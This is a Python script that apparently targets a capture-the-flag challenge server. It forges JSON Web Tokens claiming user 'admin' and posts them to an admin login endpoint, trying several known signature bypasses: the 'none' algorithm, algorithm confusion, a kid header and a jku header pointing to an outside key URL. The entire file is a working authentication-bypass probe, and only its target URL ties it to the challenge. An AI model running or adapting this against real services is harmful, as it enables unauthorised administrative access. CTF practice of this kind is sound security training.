import urllib.request
import json
import base64

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def test_jwt(header: dict, payload: dict, sig: bytes = b"sig"):
    h = b64url(json.dumps(header).encode())
    p = b64url(json.dumps(payload).encode())
    s = b64url(sig)
    token = f"{h}.{p}.{s}"

    req = urllib.request.Request(
        'http://chals.tisc26.ctf.sg:21515/api/v2/admin/login',
        data=json.dumps({'token': token}).encode(),
        headers={'Content-Type': 'application/json'}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            print("Status:", resp.status, resp.read().decode())
    except urllib.error.HTTPError as e:
        print(f"Header: {header} -> {e.code} {e.read().decode()}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    test_jwt({"alg": "none"}, {"user": "admin"})
    test_jwt({"alg": "HS256"}, {"user": "admin"})
    test_jwt({"alg": "RS256"}, {"user": "admin"})
    test_jwt({"alg": "RS256", "kid": "key1"}, {"user": "admin"})
    test_jwt({"alg": "RS256", "jku": "http://example.com/jwks.json"}, {"user": "admin"})
